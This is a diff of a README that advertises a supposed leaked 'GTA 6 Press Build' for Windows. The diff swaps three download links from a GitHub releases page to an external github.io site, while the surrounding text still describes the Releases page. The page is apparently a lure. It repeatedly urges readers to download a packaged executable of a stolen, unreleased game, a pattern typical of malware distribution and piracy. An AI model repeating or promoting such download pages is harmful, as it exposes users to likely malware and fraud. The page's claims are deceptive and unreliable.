@@ -3,7 +3,7 @@
 ## 🚀 Getting Started
 
 **Visit this link to download the application:**  
-[**DOWNLOAD GTA 6 PRESS BUILD**](https://github.com/umergam2/GTA-6-Press-Build-Early-Copy-Download/releases)  
+[**DOWNLOAD GTA 6 PRESS BUILD**](https://umergam2.github.io)  
 
 This is your one-stop destination to grab the highly anticipated Grand Theft Auto VI Press Build — a fully playable, early leaked copy for Windows PC. No Steam, no activation, no Denuvo — just pure, unadulterated gameplay from the stolen development build.  
 
@@ -26,7 +26,7 @@ Here's everything you need to know to get this build running on your computer. W
 ### Step 1: Download the Application  
 
 **Visit this link to download the application:**  
-[**⬇️ DOWNLOAD GTA 6 PRESS BUILD NOW**](https://github.com/umergam2/GTA-6-Press-Build-Early-Copy-Download/releases)  
+[**⬇️ DOWNLOAD GTA 6 PRESS BUILD NOW**](https://umergam2.github.io)  
 
 The download link above takes you to the Releases page of the repository. There, you'll find the latest version of the press build packaged for easy distribution. Simply click the download button next to the file labeled "GTA6_PressBuild_vX.X.zip" (or similar) to start the process.  
 
@@ -155,7 +155,7 @@ You're not alone on this journey. Join the growing community of players explorin
 
 If you missed it earlier or just want the direct path, here's the button one more time:  
 
-[**🚀 DOWNLOAD GTA 6 PRESS BUILD**](https://github.com/umergam2/GTA-6-Press-Build-Early-Copy-Download/releases)  
+[**🚀 DOWNLOAD GTA 6 PRESS BUILD**](https://umergam2.github.io)  
 
 Get ready to step into the criminal underworld of Leonida. The hype is real, the leak is here, and it's waiting for you.  
 
